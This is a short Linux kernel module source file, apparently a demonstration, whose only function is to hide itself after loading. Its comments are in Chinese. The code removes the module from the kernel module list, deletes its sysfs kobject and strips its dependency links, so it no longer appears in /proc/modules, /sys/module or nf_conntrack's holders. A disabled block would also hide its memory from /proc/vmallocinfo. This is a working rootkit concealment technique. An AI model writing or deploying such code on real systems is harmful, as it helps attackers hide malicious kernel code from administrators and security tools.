// hidemyself.c
#include <linux/module.h>
#include <net/netfilter/nf_conntrack_core.h>
#include <asm-generic/delay.h>
#include <linux/kallsyms.h>
#include <linux/vmalloc.h>


static void __init hide_myself(void)
{
	//struct vmap_area *va, *vtmp;
	struct module_use *use, *tmp;
	//struct list_head *_vmap_area_list;
	//struct rb_root *_vmap_area_root;

#if 0
	_vmap_area_list = (struct list_head *)kallsyms_lookup_name("vmap_area_list");
	_vmap_area_root = (struct rb_root *)kallsyms_lookup_name("vmap_area_root");

	// 摘除vmalloc调用关系链，/proc/vmallocinfo中不可见
	list_for_each_entry_safe(va, vtmp, _vmap_area_list, list) {
		if ((unsigned long)THIS_MODULE > va->va_start && (unsigned long)THIS_MODULE < va->va_end) {
			list_del(&va->list);
			// rbtree中摘除，无法通过rbtree找到
			rb_erase(&va->rb_node, _vmap_area_root);
		}
	}
#endif

	// 摘除链表，/proc/modules 中不可见。
	list_del_init(&THIS_MODULE->list);
	// 摘除kobj，/sys/modules/中不可见。
	kobject_del(&THIS_MODULE->mkobj.kobj);
	// 摘除依赖关系，本例中nf_conntrack的holder中不可见。
	list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list) {
		list_del(&use->source_list);
		list_del(&use->target_list);
		sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
		kfree(use);
	}
}

static int __init hideself_init(void)
{
    pr_info("Hello\n");
	hide_myself();

	return 0;
}

static void __exit hideself_exit(void)
{
        pr_info("Bye\n");
        return;
}
module_init(hideself_init);
module_exit(hideself_exit);
MODULE_LICENSE("GPL");
